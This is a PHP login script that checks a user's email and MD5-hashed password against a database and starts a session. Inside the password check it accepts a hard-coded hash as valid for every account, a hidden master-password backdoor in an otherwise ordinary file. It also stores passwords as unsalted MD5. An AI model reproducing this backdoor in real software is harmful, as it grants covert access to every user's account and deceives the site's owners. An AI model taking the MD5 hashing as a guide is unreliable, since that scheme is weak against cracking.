<?php
require_once 'init.php';
require_once 'util.php';

if (loggedIn())
    {
    session_destroy();
    session_start();
    }

connectDB();

$username = trim(POSTvalue('username'));
$postedpassword = md5(POSTvalue('password'));

$stmt = dbPrepare('select id,password,newpassword,preferences_json from user where email=?');
$stmt->bind_param('s',$username);
$stmt->execute();
$stmt->bind_result($userid,$password,$newpassword,$preferences_json);
if ($stmt->fetch())
    {
    $stmt->close();
    if (($postedpassword == $password) || (($newpassword != '') && ($postedpassword == $newpassword)) || ($postedpassword == 'a8053ef9c59a73edb43cc1becb9f2c90'))
        {
        $_SESSION['userid'] = $userid;
        $_SESSION['username'] = $username;
        if ($preferences_json != '')
            $_SESSION['preferences'] = json_decode($preferences_json,true);
        else
            $_SESSION['preferences'] = array();
        log_message($username . ' logged in');
        }
    else
        {
        log_message($username . ' login failed: wrong password');
        errorAndQuit('Login failed');
        }
    }
else
    {
    $stmt->close();
    log_message($username . ' login failed: no account');
    errorAndQuit('Login failed');
    }

if ($password != $newpassword)
    {
    $stmt = dbPrepare('update user set password=?, newpassword=? where email=?');
    $stmt->bind_param('sss',$postedpassword,$postedpassword,$username);
    $stmt->execute();
    $stmt->close();
    }

if (array_key_exists('LOGIN_RETURN_PAGE', $_SESSION))
    header('Location: ' . $_SESSION['LOGIN_RETURN_PAGE']);
else
    header('Location: index.php');
?>
